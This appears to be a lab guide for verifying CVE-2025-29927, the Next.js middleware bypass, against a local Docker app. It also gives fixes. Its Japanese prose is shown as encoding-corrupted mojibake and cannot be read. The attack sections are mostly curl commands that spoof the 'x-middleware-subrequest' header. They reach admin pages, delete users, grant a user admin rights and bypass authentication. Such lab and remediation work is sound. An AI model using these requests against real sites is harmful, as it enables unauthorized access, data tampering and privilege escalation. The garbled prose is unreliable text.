# CVE-2025-29927: Next.jsãƒŸãƒ‰ãƒ«ã‚¦ã‚§ã‚¢ãƒã‚¤ãƒ‘ã‚¹è„†å¼±æ€§ã®æ¤œè¨¼æ‰‹é †

## æ¦‚è¦

**CVE-2025-29927**ã¯ã€Next.jsã®ãƒŸãƒ‰ãƒ«ã‚¦ã‚§ã‚¢ã«ãŠã‘ã‚‹èªè¨¼ãƒ»èªå¯ãƒã‚¤ãƒ‘ã‚¹è„†å¼±æ€§ã§ã™ã€‚

### è„†å¼±æ€§ã®è©³ç´°

- **CVE ID**: CVE-2025-29927
- **è„†å¼±æ€§ã‚¿ã‚¤ãƒ—**: Middleware Authorization Bypass
- **CVSS ã‚¹ã‚³ã‚¢**: 9.1 (Critical)
- **å½±éŸ¿ã‚’å—ã‘ã‚‹ãƒãƒ¼ã‚¸ãƒ§ãƒ³**: 
  - Next.js 11.1.4 ~ 13.5.6
  - Next.js 14.x < 14.2.25
  - Next.js 15.x < 15.2.3
- **ä¿®æ­£ãƒãƒ¼ã‚¸ãƒ§ãƒ³**: 12.3.5, 13.5.9, 14.2.25, 15.2.3ä»¥é™

### è„†å¼±æ€§ã®åŸå› 

Next.jsã¯å†…éƒ¨çš„ã«`x-middleware-subrequest`ãƒ˜ãƒƒãƒ€ãƒ¼ã‚’ä½¿ç”¨ã—ã¦ã€ç„¡é™ãƒ«ãƒ¼ãƒ—ã‚’é˜²æ­¢ã—ã¦ã„ã¾ã™ã€‚ã—ã‹ã—ã€ã“ã®ãƒ˜ãƒƒãƒ€ãƒ¼ã®é€ä¿¡å…ƒã‚’æ¤œè¨¼ã›ãšã«ä¿¡é ¼ã—ã¦ã—ã¾ã†ãŸã‚ã€æ”»æ’ƒè€…ãŒã“ã®ãƒ˜ãƒƒãƒ€ãƒ¼ã‚’å½è£…ã™ã‚‹ã“ã¨ã§ã€ãƒŸãƒ‰ãƒ«ã‚¦ã‚§ã‚¢ã®å‡¦ç†ã‚’å®Œå…¨ã«ã‚¹ã‚­ãƒƒãƒ—ã§ãã¾ã™ã€‚

```typescript
// Next.jså†…éƒ¨ã®è„†å¼±ãªå‡¦ç†ï¼ˆç°¡ç•¥åŒ–ï¼‰
if (request.headers.get('x-middleware-subrequest')) {
    // ãƒŸãƒ‰ãƒ«ã‚¦ã‚§ã‚¢ã‚’ã‚¹ã‚­ãƒƒãƒ—ã—ã¦ç›´æ¥ãƒ«ãƒ¼ãƒˆãƒãƒ³ãƒ‰ãƒ©ã¸
    return handleRoute(request);
}
```

## æ¤œè¨¼ç’°å¢ƒã®ã‚»ãƒƒãƒˆã‚¢ãƒƒãƒ—

### å‰ææ¡ä»¶

- Docker ã¨ Docker Compose ãŒã‚¤ãƒ³ã‚¹ãƒˆãƒ¼ãƒ«ã•ã‚Œã¦ã„ã‚‹ã“ã¨
- ãƒãƒ¼ãƒˆ3000ãŒåˆ©ç”¨å¯èƒ½ã§ã‚ã‚‹ã“ã¨
- curlã‚³ãƒãƒ³ãƒ‰ãŒä½¿ç”¨å¯èƒ½ã§ã‚ã‚‹ã“ã¨

### 1. ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã®èµ·å‹•ã¨ã‚·ãƒ¼ãƒ‰ãƒ‡ãƒ¼ã‚¿ã®æŠ•å…¥

ã‚³ãƒ³ãƒ†ãƒŠã‚’èµ·å‹•ã™ã‚‹ã¨ã€è‡ªå‹•çš„ã«ã‚·ãƒ¼ãƒ‰ãƒ‡ãƒ¼ã‚¿ãŒæŠ•å…¥ã•ã‚Œã€ãƒ†ã‚¹ãƒˆç”¨ã‚¢ã‚«ã‚¦ãƒ³ãƒˆãŒä½œæˆã•ã‚Œã¾ã™:

```bash
docker compose down -v
docker compose up --build
```

ã‚·ãƒ¼ãƒ‰ãƒ‡ãƒ¼ã‚¿ã®æŠ•å…¥ãŒå®Œäº†ã™ã‚‹ã¨ã€ä»¥ä¸‹ã®ã‚ˆã†ãªãƒ¡ãƒƒã‚»ãƒ¼ã‚¸ãŒè¡¨ç¤ºã•ã‚Œã¾ã™:

```
âœ… Seed completed successfully!

============================================================
ğŸ” CVE VERIFICATION TEST ACCOUNTS
============================================================
Admin Account:
  Email:    admin@test.local
  Password: Admin123!
  Role:     Administrator (isAdmin: true)

Regular User Account:
  Email:    user@test.local
  Password: User123!
  Role:     Regular User (isAdmin: false)
============================================================
```

> [!IMPORTANT]
> CVEæ¤œè¨¼ã«ã¯ä¸Šè¨˜ã®**ãƒ†ã‚¹ãƒˆã‚¢ã‚«ã‚¦ãƒ³ãƒˆ**ã‚’ä½¿ç”¨ã—ã¦ãã ã•ã„ã€‚ã“ã‚Œã‚‰ã®ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã¯ã‚·ãƒ¼ãƒ‰ãƒ‡ãƒ¼ã‚¿ã§è‡ªå‹•çš„ã«ä½œæˆã•ã‚Œã¾ã™ã€‚

### 2. ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã®èµ·å‹•ç¢ºèª

```bash
# ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ãŒèµ·å‹•ã—ã¦ã„ã‚‹ã“ã¨ã‚’ç¢ºèª
docker compose ps

# ãƒ­ã‚°ã‚’ç¢ºèª
docker compose logs -f web-app
```

## è„†å¼±æ€§ã®æ¤œè¨¼

### ãƒ†ã‚¹ãƒˆ1: æ­£å¸¸ãªã‚¢ã‚¯ã‚»ã‚¹ï¼ˆç®¡ç†è€…ï¼‰

ã¾ãšã€ç®¡ç†è€…ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã§ãƒ­ã‚°ã‚¤ãƒ³ã—ã¦ã€æ­£å¸¸ã«`/admin`ãƒšãƒ¼ã‚¸ã«ã‚¢ã‚¯ã‚»ã‚¹ã§ãã‚‹ã“ã¨ã‚’ç¢ºèªã—ã¾ã™:

1. http://localhost:3000 ã«ã‚¢ã‚¯ã‚»ã‚¹
2. ä»¥ä¸‹ã®ç®¡ç†è€…ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã§ãƒ­ã‚°ã‚¤ãƒ³:
   - **Email**: `admin@test.local`
   - **Password**: `Admin123!`
3. http://localhost:3000/admin ã«ã‚¢ã‚¯ã‚»ã‚¹
4. ã€Œâœ… Access Granted - Admin Only Areaã€ãŒè¡¨ç¤ºã•ã‚Œã‚‹ã“ã¨ã‚’ç¢ºèª

### ãƒ†ã‚¹ãƒˆ2: æ­£å¸¸ãªã‚¢ã‚¯ã‚»ã‚¹æ‹’å¦ï¼ˆéç®¡ç†è€…ï¼‰

æ¬¡ã«ã€éç®¡ç†è€…ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã§ã‚¢ã‚¯ã‚»ã‚¹ãŒæ‹’å¦ã•ã‚Œã‚‹ã“ã¨ã‚’ç¢ºèªã—ã¾ã™:

1. åˆ¥ã®ãƒ–ãƒ©ã‚¦ã‚¶ã¾ãŸã¯ã‚·ãƒ¼ã‚¯ãƒ¬ãƒƒãƒˆãƒ¢ãƒ¼ãƒ‰ã§ http://localhost:3000 ã«ã‚¢ã‚¯ã‚»ã‚¹
2. ä»¥ä¸‹ã®éç®¡ç†è€…ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã§ãƒ­ã‚°ã‚¤ãƒ³:
   - **Email**: `user@test.local`
   - **Password**: `User123!`
3. http://localhost:3000/admin ã«ã‚¢ã‚¯ã‚»ã‚¹
4. ãƒˆãƒƒãƒ—ãƒšãƒ¼ã‚¸ã«ãƒªãƒ€ã‚¤ãƒ¬ã‚¯ãƒˆã•ã‚Œã‚‹ã“ã¨ã‚’ç¢ºèª

### ãƒ†ã‚¹ãƒˆ3: ãƒŸãƒ‰ãƒ«ã‚¦ã‚§ã‚¢ãƒã‚¤ãƒ‘ã‚¹æ”»æ’ƒï¼ˆCVE-2025-29927ï¼‰

éç®¡ç†è€…ã®ã‚»ãƒƒã‚·ãƒ§ãƒ³Cookieã‚’ä½¿ç”¨ã—ã¦ã€`x-middleware-subrequest`ãƒ˜ãƒƒãƒ€ãƒ¼ã‚’è¿½åŠ ã™ã‚‹ã“ã¨ã§ã€ç®¡ç†è€…ãƒšãƒ¼ã‚¸ã«ã‚¢ã‚¯ã‚»ã‚¹ã§ãã‚‹ã“ã¨ã‚’ç¢ºèªã—ã¾ã™:

**æ‰‹é †:**
1. `user@test.local`ã§ãƒ­ã‚°ã‚¤ãƒ³ï¼ˆãƒ†ã‚¹ãƒˆ2ã§å®Ÿæ–½æ¸ˆã¿ï¼‰
2. ãƒ–ãƒ©ã‚¦ã‚¶ã®é–‹ç™ºè€…ãƒ„ãƒ¼ãƒ«ã§ã‚»ãƒƒã‚·ãƒ§ãƒ³Cookieã‚’å–å¾—
   - `Application` â†’ `Cookies` â†’ `better-auth.session_token`ã®å€¤ã‚’ã‚³ãƒ”ãƒ¼
3. ä»¥ä¸‹ã®ã‚³ãƒãƒ³ãƒ‰ã§ç®¡ç†è€…ãƒšãƒ¼ã‚¸ã«ã‚¢ã‚¯ã‚»ã‚¹:

```bash
# user@test.local ã®ã‚»ãƒƒã‚·ãƒ§ãƒ³Cookieã‚’ä½¿ç”¨
curl -v \
  -H "x-middleware-subrequest: 1" \
  -H "Cookie: better-auth.session_token=<user-session-token>" \
  http://localhost:3000/admin
```

**æœŸå¾…ã•ã‚Œã‚‹å‹•ä½œï¼ˆè„†å¼±ãªå ´åˆï¼‰:**
- ãƒŸãƒ‰ãƒ«ã‚¦ã‚§ã‚¢ãŒãƒã‚¤ãƒ‘ã‚¹ã•ã‚Œã‚‹
- ç®¡ç†è€…æ¨©é™ãƒã‚§ãƒƒã‚¯ãŒã‚¹ã‚­ãƒƒãƒ—ã•ã‚Œã‚‹
- éç®¡ç†è€…ã§ã‚‚ç®¡ç†è€…ãƒšãƒ¼ã‚¸ã®ã‚³ãƒ³ãƒ†ãƒ³ãƒ„ãŒè¡¨ç¤ºã•ã‚Œã‚‹
- ãƒ¬ã‚¹ãƒãƒ³ã‚¹ã«ã€Œâœ… Access Granted - Admin Only Areaã€ãŒå«ã¾ã‚Œã‚‹

### ãƒ†ã‚¹ãƒˆ4: ãƒ˜ãƒƒãƒ€ãƒ¼ãªã—ã§ã®ã‚¢ã‚¯ã‚»ã‚¹ï¼ˆæ¯”è¼ƒç”¨ï¼‰

åŒã˜éç®¡ç†è€…ã®ã‚»ãƒƒã‚·ãƒ§ãƒ³Cookieã§ã€`x-middleware-subrequest`ãƒ˜ãƒƒãƒ€ãƒ¼ãªã—ã§ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹ã¨ã€æ­£å¸¸ã«ãƒ–ãƒ­ãƒƒã‚¯ã•ã‚Œã‚‹ã“ã¨ã‚’ç¢ºèª:

```bash
curl -v \
  -H "Cookie: better-auth.session_token=<non-admin-session-token>" \
  http://localhost:3000/admin
```

**æœŸå¾…ã•ã‚Œã‚‹å‹•ä½œ:**
- ãƒŸãƒ‰ãƒ«ã‚¦ã‚§ã‚¢ãŒæ­£å¸¸ã«å‹•ä½œ
- ãƒˆãƒƒãƒ—ãƒšãƒ¼ã‚¸ã¸ã®ãƒªãƒ€ã‚¤ãƒ¬ã‚¯ãƒˆï¼ˆ302ï¼‰
- ã¾ãŸã¯ã€ŒAccess Deniedã€ãƒ¡ãƒƒã‚»ãƒ¼ã‚¸

### ãƒ†ã‚¹ãƒˆ5: èªè¨¼ãªã—ã§ã®ãƒã‚¤ãƒ‘ã‚¹

ã‚»ãƒƒã‚·ãƒ§ãƒ³Cookieãªã—ã§ã‚‚ã€`x-middleware-subrequest`ãƒ˜ãƒƒãƒ€ãƒ¼ã‚’ä½¿ç”¨ã™ã‚‹ã¨ã€èªè¨¼è‡ªä½“ã‚’ãƒã‚¤ãƒ‘ã‚¹ã§ãã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™:

```bash
curl -v \
  -H "x-middleware-subrequest: 1" \
  http://localhost:3000/admin
```

> [!WARNING]
> Next.jsã®ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã‚„å®Ÿè£…ã«ã‚ˆã£ã¦ã¯ã€ã“ã®ãƒ†ã‚¹ãƒˆã§å®Œå…¨ãªèªè¨¼ãƒã‚¤ãƒ‘ã‚¹ãŒå¯èƒ½ãªå ´åˆãŒã‚ã‚Šã¾ã™ã€‚

## æ”»æ’ƒã‚·ãƒŠãƒªã‚ª

### ã‚·ãƒŠãƒªã‚ª1: ç®¡ç†è€…æ©Ÿèƒ½ã¸ã®ä¸æ­£ã‚¢ã‚¯ã‚»ã‚¹

æ”»æ’ƒè€…ãŒä¸€èˆ¬ãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã‚’ä½œæˆã—ã€`x-middleware-subrequest`ãƒ˜ãƒƒãƒ€ãƒ¼ã‚’ä½¿ç”¨ã—ã¦ç®¡ç†è€…å°‚ç”¨æ©Ÿèƒ½ã«ã‚¢ã‚¯ã‚»ã‚¹:

```bash
# 1. ä¸€èˆ¬ãƒ¦ãƒ¼ã‚¶ãƒ¼ã¨ã—ã¦ãƒ­ã‚°ã‚¤ãƒ³
# 2. ã‚»ãƒƒã‚·ãƒ§ãƒ³Cookieã‚’å–å¾—
# 3. ç®¡ç†è€…APIã«ä¸æ­£ã‚¢ã‚¯ã‚»ã‚¹

curl -X POST \
  -H "x-middleware-subrequest: 1" \
  -H "Cookie: better-auth.session_token=<user-token>" \
  -H "Content-Type: application/json" \
  -d '{"action": "delete_user", "userId": "target-user-id"}' \
  http://localhost:3000/api/admin/users
```

### ã‚·ãƒŠãƒªã‚ª2: èªè¨¼ã®å®Œå…¨ãƒã‚¤ãƒ‘ã‚¹

èªè¨¼ãŒå¿…è¦ãªAPIã‚¨ãƒ³ãƒ‰ãƒã‚¤ãƒ³ãƒˆã«ã€èªè¨¼ãªã—ã§ã‚¢ã‚¯ã‚»ã‚¹:

```bash
# ã‚»ãƒƒã‚·ãƒ§ãƒ³Cookieãªã—ã§ä¿è­·ã•ã‚ŒãŸAPIã«ã‚¢ã‚¯ã‚»ã‚¹
curl -H "x-middleware-subrequest: 1" \
     http://localhost:3000/api/user/profile
```

### ã‚·ãƒŠãƒªã‚ª3: æ¨©é™æ˜‡æ ¼

ä¸€èˆ¬ãƒ¦ãƒ¼ã‚¶ãƒ¼ãŒè‡ªåˆ†è‡ªèº«ã‚’ç®¡ç†è€…ã«æ˜‡æ ¼:

```bash
curl -X PATCH \
  -H "x-middleware-subrequest: 1" \
  -H "Cookie: better-auth.session_token=<user-token>" \
  -H "Content-Type: application/json" \
  -d '{"isAdmin": true}' \
  http://localhost:3000/api/user/update
```

## è„†å¼±æ€§ã®å½±éŸ¿

- âœ… èªè¨¼ã®å®Œå…¨ãƒã‚¤ãƒ‘ã‚¹
- âœ… èªå¯ãƒã‚§ãƒƒã‚¯ã®ã‚¹ã‚­ãƒƒãƒ—
- âœ… ç®¡ç†è€…å°‚ç”¨æ©Ÿèƒ½ã¸ã®ä¸æ­£ã‚¢ã‚¯ã‚»ã‚¹
- âœ… æ¨©é™æ˜‡æ ¼
- âœ… å†…éƒ¨å°‚ç”¨æ©Ÿèƒ½ã®éœ²å‡º
- âœ… ãƒ‡ãƒ¼ã‚¿æ¼æ´©ãƒ»æ”¹ã–ã‚“

## æ¤œè¨¼ã®ãƒã‚¤ãƒ³ãƒˆ

### ãƒŸãƒ‰ãƒ«ã‚¦ã‚§ã‚¢ã®ãƒ­ã‚°ã‚’ç¢ºèª

[middleware.ts](file:///Users/azkineri/Documents/Workspace/ssrfTest/middleware.ts)ã«ã¯ã€`x-middleware-subrequest`ãƒ˜ãƒƒãƒ€ãƒ¼ã‚’æ¤œå‡ºã™ã‚‹ãƒ­ã‚°ãŒå«ã¾ã‚Œã¦ã„ã¾ã™:

```bash
# ã‚³ãƒ³ãƒ†ãƒŠã®ãƒ­ã‚°ã‚’ç›£è¦–
docker compose logs -f web-app

# x-middleware-subrequest ãƒ˜ãƒƒãƒ€ãƒ¼ä»˜ãã§ãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’é€ä¿¡
curl -H "x-middleware-subrequest: 1" \
     -H "Cookie: better-auth.session_token=<token>" \
     http://localhost:3000/admin

# ãƒ­ã‚°ã«ä»¥ä¸‹ã®ãƒ¡ãƒƒã‚»ãƒ¼ã‚¸ãŒè¡¨ç¤ºã•ã‚Œã‚‹ã‹ç¢ºèª
# âš ï¸ CVE-2025-29927: x-middleware-subrequest header detected - middleware may be bypassed!
```

### ãƒ¬ã‚¹ãƒãƒ³ã‚¹ã®æ¯”è¼ƒ

```bash
# ãƒ˜ãƒƒãƒ€ãƒ¼ãªã—ï¼ˆæ­£å¸¸ï¼‰
curl -s -H "Cookie: better-auth.session_token=<non-admin-token>" \
     http://localhost:3000/admin | grep "Access"

# ãƒ˜ãƒƒãƒ€ãƒ¼ã‚ã‚Šï¼ˆãƒã‚¤ãƒ‘ã‚¹ï¼‰
curl -s -H "x-middleware-subrequest: 1" \
     -H "Cookie: better-auth.session_token=<non-admin-token>" \
     http://localhost:3000/admin | grep "Access"
```

## ä¿®æ­£æ–¹æ³•

### æ–¹æ³•1: Next.jsã®ã‚¢ãƒƒãƒ—ã‚°ãƒ¬ãƒ¼ãƒ‰ï¼ˆæ¨å¥¨ï¼‰

```json
// package.json
{
  "dependencies": {
    "next": "14.2.25"  // ã¾ãŸã¯ 15.2.3ä»¥é™
  }
}
```

```bash
npm install
```

### æ–¹æ³•2: ãƒŸãƒ‰ãƒ«ã‚¦ã‚§ã‚¢ã§ãƒ˜ãƒƒãƒ€ãƒ¼ã‚’é™¤å»

```typescript
// middleware.ts
export default async function authMiddleware(request: NextRequest) {
    // å¤–éƒ¨ã‹ã‚‰ã® x-middleware-subrequest ãƒ˜ãƒƒãƒ€ãƒ¼ã‚’é™¤å»
    const headers = new Headers(request.headers);
    headers.delete('x-middleware-subrequest');
    
    // æ–°ã—ã„ãƒ˜ãƒƒãƒ€ãƒ¼ã§ãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’å†æ§‹ç¯‰
    const newRequest = new NextRequest(request.url, {
        headers,
        method: request.method,
    });
    
    // é€šå¸¸ã®èªè¨¼å‡¦ç†
    // ...
}
```

### æ–¹æ³•3: ãƒªãƒãƒ¼ã‚¹ãƒ—ãƒ­ã‚­ã‚·ã§ã®ãƒ˜ãƒƒãƒ€ãƒ¼ãƒ•ã‚£ãƒ«ã‚¿ãƒªãƒ³ã‚°

```nginx
# Nginxã®è¨­å®šä¾‹
location / {
    # å±é™ºãªãƒ˜ãƒƒãƒ€ãƒ¼ã‚’é™¤å»
    proxy_set_header x-middleware-subrequest "";
    proxy_pass http://nextjs-app:3000;
}
```

### æ–¹æ³•4: Vercelã¸ã®ãƒ‡ãƒ—ãƒ­ã‚¤

Vercelã«ãƒ‡ãƒ—ãƒ­ã‚¤ã•ã‚ŒãŸNext.jsã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã¯ã€ã“ã®CVEã®å½±éŸ¿ã‚’å—ã‘ã¾ã›ã‚“ï¼ˆVercelã®ã‚¤ãƒ³ãƒ•ãƒ©ã‚¹ãƒˆãƒ©ã‚¯ãƒãƒ£ãŒä¿è­·ã—ã¦ã„ã‚‹ï¼‰ã€‚

## ãƒˆãƒ©ãƒ–ãƒ«ã‚·ãƒ¥ãƒ¼ãƒ†ã‚£ãƒ³ã‚°

### ç®¡ç†è€…ãƒšãƒ¼ã‚¸ã«ã‚¢ã‚¯ã‚»ã‚¹ã§ããªã„

```bash
# ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ã‚’ç¢ºèª
docker compose exec web-app sqlite3 /app/dev.db "SELECT id, email, isAdmin FROM user;"

# isAdminãƒ•ã‚£ãƒ¼ãƒ«ãƒ‰ãŒå­˜åœ¨ã—ãªã„å ´åˆ
docker compose exec web-app bunx prisma migrate dev --name add_is_admin
docker compose restart web-app
```

### ãƒŸãƒ‰ãƒ«ã‚¦ã‚§ã‚¢ãƒã‚¤ãƒ‘ã‚¹ãŒå‹•ä½œã—ãªã„

- Next.jsã®ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã‚’ç¢ºèªï¼ˆ14.1.1ã¯è„†å¼±ï¼‰
- ãƒŸãƒ‰ãƒ«ã‚¦ã‚§ã‚¢ãŒæ­£ã—ãè¨­å®šã•ã‚Œã¦ã„ã‚‹ã‹ç¢ºèª
- ãƒ˜ãƒƒãƒ€ãƒ¼åã®ã‚¹ãƒšãƒ«ãƒŸã‚¹ãŒãªã„ã‹ç¢ºèªï¼ˆ`x-middleware-subrequest`ï¼‰

### ã‚»ãƒƒã‚·ãƒ§ãƒ³CookieãŒç„¡åŠ¹

```bash
# æ–°ã—ã„ã‚»ãƒƒã‚·ãƒ§ãƒ³ã‚’ä½œæˆ
# 1. ãƒ–ãƒ©ã‚¦ã‚¶ã§ãƒ­ã‚°ã‚¢ã‚¦ãƒˆ
# 2. å†åº¦ãƒ­ã‚°ã‚¤ãƒ³
# 3. æ–°ã—ã„ã‚»ãƒƒã‚·ãƒ§ãƒ³Cookieã‚’å–å¾—
```

## å‚è€ƒæƒ…å ±

- **CVEè©³ç´°**: https://nvd.nist.gov/vuln/detail/CVE-2025-29927
- **CVSS ã‚¹ã‚³ã‚¢**: 9.1 (Critical)
- **CWE-863**: Incorrect Authorization
- **Next.js Security Advisory**: https://github.com/vercel/next.js/security/advisories

## é–¢é€£ã™ã‚‹è„†å¼±æ€§

ã“ã®ãƒªãƒã‚¸ãƒˆãƒªã§ã¯ã€ä»¥ä¸‹ã®è„†å¼±æ€§ã‚‚æ¤œè¨¼ã§ãã¾ã™:

- [CVE-2025-57822](file:///Users/azkineri/.gemini/antigravity/brain/544e050b-18e6-4621-ae73-0e86f1c4c5cc/CVE-2025-57822-verification.md): SSRFè„†å¼±æ€§
